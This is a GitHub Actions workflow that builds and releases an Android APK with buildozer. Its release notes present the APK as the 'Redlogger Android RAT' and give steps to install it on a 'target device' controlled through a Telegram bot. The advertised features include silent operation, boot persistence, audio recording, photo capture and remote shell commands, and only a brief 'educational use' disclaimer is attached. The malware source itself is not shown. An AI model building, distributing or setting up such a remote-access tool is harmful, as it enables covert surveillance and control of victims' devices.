name: Build Android APK

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'

    - name: Set up Java
      uses: actions/setup-java@v3
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: Install system dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses-dev cmake libffi-dev libssl-dev

    - name: Install Python dependencies
      run: |
        python -m pip install --upgrade pip
        pip install buildozer cython

    - name: Cache Buildozer global directory
      uses: actions/cache@v3
      with:
        path: ~/.buildozer
        key: buildozer-${{ runner.os }}-${{ hashFiles('redlogger_client/buildozer.spec') }}

    - name: Cache Buildozer dependencies
      uses: actions/cache@v3
      with:
        path: redlogger_client/.buildozer
        key: buildozer-deps-${{ runner.os }}-${{ hashFiles('redlogger_client/buildozer.spec') }}

    # 👇👇 أهم خطوة: تثبيت SDK يدوياً
    - name: Manually install Android SDK cmdline-tools
      run: |
        mkdir -p ~/.buildozer/android/platform/android-sdk/cmdline-tools
        cd ~/.buildozer/android/platform/android-sdk/cmdline-tools
        curl -o sdk.zip https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
        unzip sdk.zip -d latest
        rm sdk.zip

    - name: Accept Android SDK licenses
      run: yes | ~/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses

    - name: Build Android APK
      working-directory: redlogger_client
      env:
        ANDROID_HOME: /home/runner/.buildozer/android/platform/android-sdk
        PATH: /home/runner/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin:/usr/local/bin:/usr/bin:/bin
      run: |
        buildozer android debug

    - name: List APK files
      working-directory: redlogger_client
      run: ls -la bin/

    - name: Upload APK artifact
      uses: actions/upload-artifact@v4
      with:
        name: redlogger-debug-apk
        path: redlogger_client/bin/*.apk

    - name: Create Release (on tag)
      if: startsWith(github.ref, 'refs/tags/')
      uses: softprops/action-gh-release@v1
      with:
        files: redlogger_client/bin/*.apk
        name: Redlogger ${{ github.ref_name }}
        body: |
          ## Redlogger Android RAT - Release ${{ github.ref_name }}

          ### 📱 APK Download
          Download the APK file below and install it on your target Android device.

          ### ⚠️ Educational Use Only
          This tool is for educational and authorized penetration testing purposes only.

          ### 🔧 Setup Instructions
          1. Download the APK
          2. Configure your Telegram bot token and chat ID
          3. Set up your No-IP domain (optional)
          4. Install on target device
          5. Start the controller server

          ### 📋 Features
          - Silent background operation
          - Boot persistence
          - Device information collection
          - Audio recording
          - Photo capture
          - File management
          - Shell command execution
          - Telegram Bot C2
          - No-IP DDNS support
        draft: false
        prerelease: false
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}